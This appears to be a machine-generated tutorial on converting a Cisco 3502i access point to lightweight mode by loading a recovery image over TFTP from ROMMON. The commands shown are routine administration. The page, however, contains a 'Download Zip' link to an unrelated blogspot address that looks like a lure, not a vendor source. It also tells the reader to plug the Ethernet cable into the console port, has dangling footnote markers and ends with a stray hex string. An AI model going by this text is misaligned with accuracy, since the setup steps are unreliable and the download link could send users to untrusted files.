## How to Convert a Cisco 3502i Access Point from Autonomous to Lightweight Mode

  
# How to Convert a Cisco 3502i Access Point from Autonomous to Lightweight Mode
 
If you have a Cisco 3502i access point that is running in autonomous mode, you might want to convert it to lightweight mode so that it can join a wireless LAN controller (WLC) and be centrally managed. This article will show you how to do that using a recovery mode file and a TFTP server.
 
## ap3g1 rcvk9w8 tar 152 2 jb tar


[**Download Zip**](https://lomasmavi.blogspot.com/?c=2tM3hJ)

 
## Step 1: Download the Recovery Mode File
 
The recovery mode file is a lightweight image that allows the access point to join a WLC without having the full image. You can download the recovery mode file from the Cisco website. In this example, we will use the file `ap3g1-rcvk9w8-tar.152-2.JB.tar`, which is compatible with Cisco IOS Release 15.2(2)JB[^1^]. Make sure you have a valid Cisco account to access the download page.
 
## Step 2: Configure a TFTP Server
 
You will need a TFTP server to transfer the recovery mode file to the access point. You can use any TFTP server software that you prefer, such as TFTPD32 or SolarWinds TFTP Server. Make sure that the TFTP server is running on your PC and that the recovery mode file is in the TFTP server folder.
 
## Step 3: Configure a Static IP Address on Your PC
 
You will need to configure a static IP address on your PC that is in the same subnet as the access point. For example, you can use `10.0.0.2` with a subnet mask of `255.255.255.0`. The default IP address of the access point in autonomous mode is `10.0.0.1`.
 
## Step 4: Connect Your PC to the Access Point
 
You will need to connect your PC directly to the access point using an Ethernet cable. Plug one end of the cable into the Ethernet port of your PC and the other end into the console port of the access point. You will also need a console cable and a terminal emulator software such as PuTTY or HyperTerminal to access the access point's CLI.
 
## Step 5: Boot the Access Point into Recovery Mode
 
You will need to reboot the access point and interrupt the boot process by pressing `Esc` when prompted. This will bring you to the ROMMON prompt, which looks like this: `ap:`. From there, you will need to enter the following commands to boot into recovery mode:

    ap: set IP_ADDR 10.0.0.1
    ap: set NETMASK 255.255.255.0
    ap: set DEFAULT_ROUTER 10.0.0.2
    ap: tftp_init
    ap: ether_init
    ap: tar -xtract tftp://10.0.0.2/ap3g1-rcvk9w8-tar.152-2.JB.tar flash:
    ap: set BOOT flash:/ap3g1-rcvk9w8-mx/ap3g1-rcvk9w8-mx
    ap: boot

The first three commands set the IP address, subnet mask, and default gateway of the access point. The next two commands initialize the TFTP and Ethernet interfaces. The sixth command extracts the recovery mode file from the TFTP server and copies it to the flash memory of the access point. The seventh command sets the boot variable to point to the extracted file. The last command boots the access point using the recovery mode file.
 
## Step 6: Join the Access Point to a WLC
 
After booting into recovery mode, the access point will try to discover and join a WLC using various methods, such as DHCP option 43, DNS, or broadcast[^2^]. Make sure that your WLC is reachable from your access point and that it has enough licenses to support your access point model. You can check the status of your access point on the WLC's web interface or CLI.
 0f148eb4a0
